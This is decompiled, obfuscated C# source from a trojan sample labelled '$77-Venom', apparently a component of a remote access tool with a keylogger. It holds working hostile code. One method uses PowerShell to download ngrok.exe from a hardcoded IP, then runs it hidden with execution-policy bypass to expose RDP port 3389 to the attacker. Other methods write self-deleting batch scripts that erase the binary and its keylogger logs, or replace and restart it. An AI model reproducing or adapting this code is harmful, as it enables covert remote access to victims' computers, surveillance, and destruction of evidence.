// Decompiled with JetBrains decompiler
// Type: 环㴭鮖圛鐂翎瀉솦๝뚾ꕂꍖ읿ᗕ軯˖敷ᆴ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using xClient.Core.Utilities;

public static class 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ
{
  private const string 션\uEFAE\u0CD9䓤\u32CA악恓ᅈ剝넅밪ㅭ褃㜡翄\u0C5C腺ྺ\uEE49㮀 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random \u24D1韱\u0E3E퉧\uE376\uF72B홾ᨴ娺唘龀\uE8D2輜౫龳똣列㝄\uE5F5\uED53 = new Random(Environment.TickCount);

  public static string Զ爒᪓\uEC79䰫嬕妮\u259A堝渱褚뭽墨云Ǖ䦦\uF047㝺軍縪(int length, string extension = "")
  {
    StringBuilder stringBuilder = new StringBuilder(length);
    for (int index = 0; index < length; ++index)
      stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.\u24D1韱\u0E3E퉧\uE376\uF72B홾ᨴ娺唘龀\uE8D2輜౫龳똣列㝄\uE5F5\uED53.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
    return stringBuilder.ToString() + extension;
  }

  public static string 䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(string extension)
  {
    string path;
    do
    {
      path = Path.Combine(Path.GetTempPath(), 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.Զ爒᪓\uEC79䰫嬕妮\u259A堝渱褚뭽墨云Ǖ䦦\uF047㝺軍縪(12, extension));
    }
    while (File.Exists(path));
    return path;
  }

  public static bool 顳쎩隥鑽\uFFFD̰\uEE6E㖸锰\uF2DB쇟颹옞閨\uFFFD\uF7D6\u2082体겡깗(byte[] block)
  {
    if (block.Length < 2)
      return false;
    if (block[0] == (byte) 77 && block[1] == (byte) 90)
      return true;
    return block[0] == (byte) 90 && block[1] == (byte) 77;
  }

  public static bool 覹廕摈퍠㔀謌삋ⅳﱗ즫\uECBB搸\uE3AEച\uEC8D墑翷ﵛള嚶(string filePath) => 蛲鷿㹣\uF592홅\uE8CB\uE05E泆菘ꕾꂥ\u23ED戅立\uF0BB夞鍋ᑄ㶻馚.њኋ\uE563Ṯ\uEFE3\uE6D8䬙䙒瀇㹆\uE277\uE082\u29A2뗮㩹䝞耏\u1940쑊溘(filePath + ":Zone.Identifier");

  public static string ｲꌂ焦뎚\u2E0C춟\u0832ꁎ酚\uFFFD瀼嬴䤩듈滽ދ䂌웻ʻ珻(bool isFileHidden)
  {
    try
    {
      string path = 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\"\r\nrmdir /q /s \"" + Keylogger.LogDirectory + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string ᜩ챞唼呟撨魻틦櫰\uF0B3ᓸ류\u2D72\uF736陸ꐑ㔃촪ǁ폑㱇(string token)
  {
    try
    {
      string path = Path.Combine(Path.GetTempPath(), "ngrok.bat");
      string contents = "set downloadURL=http://91.134.207.16/ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\nset exeFile=%TEMP%\\ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\npowershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');\r\n%exeFile% authtoken " + token + " \r\n%exeFile%  tcp  3389 > %logFile% \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -noexit -executionpolicy bypass -File " + path + " ",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 깘꯭໑鋨䍇ꢶ㮙\uE7A6\u1CFCꗓݹ\uFFFD쾤\uF4F9\uEF41搭汱ㆭ拙\u0E91(
    string newFilePath,
    bool isFileHidden)
  {
    try
    {
      string path = 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\"\r\nstart \"\" \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 뗶\uECA2䠂횣ۑ\uFFFD輪㰏\uF600㬭㙢우慮呎Ⱔ儽塘謞롭碑()
  {
    try
    {
      string path = 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + 熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static void 췂㮜慫⃨ﰉᦋ蠯\uEC6D흊䐕嚛ﭑ䏢\u2574啵\u2403\uF535ð鉏\uFFFD(
    string filename,
    string appendText)
  {
    appendText = 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.ꥸ婨ᾧ\uFFFD誱齴ⴌ渊\u20C8䛢\u2AB8ꤨ㤈\uFFFDꕶᬄ虆皪꧗ꄩ(filename) + appendText;
    using (FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write))
    {
      byte[] buffer = 湝增ﭞ嵇ʧ\uF2CD\uFFFD뜚罡ꈱ\u2B63\u2011퐖珎\u1CAD胂\uEF70ต댩\uEB37.\u2D72\uD7FF塻颿ጚﬄᕌ쯮\uAA4F鞞\uF6CDꦪ뺩玼ሱ쁔爢좨辷\uE3C0(Encoding.UTF8.GetBytes(appendText));
      fileStream.Seek(0L, SeekOrigin.Begin);
      fileStream.Write(buffer, 0, buffer.Length);
    }
  }

  public static string ꥸ婨ᾧ\uFFFD誱齴ⴌ渊\u20C8䛢\u2AB8ꤨ㤈\uFFFDꕶᬄ虆皪꧗ꄩ(string filename) => !File.Exists(filename) ? string.Empty : Encoding.UTF8.GetString(湝增ﭞ嵇ʧ\uF2CD\uFFFD뜚罡ꈱ\u2B63\u2011퐖珎\u1CAD胂\uEF70ต댩\uEB37.憲\uF525イ귉鏴䖹좍࿆제廰揆頻Ἳ棝᭫혍첀\uFFFD떣未(File.ReadAllBytes(filename)));
}
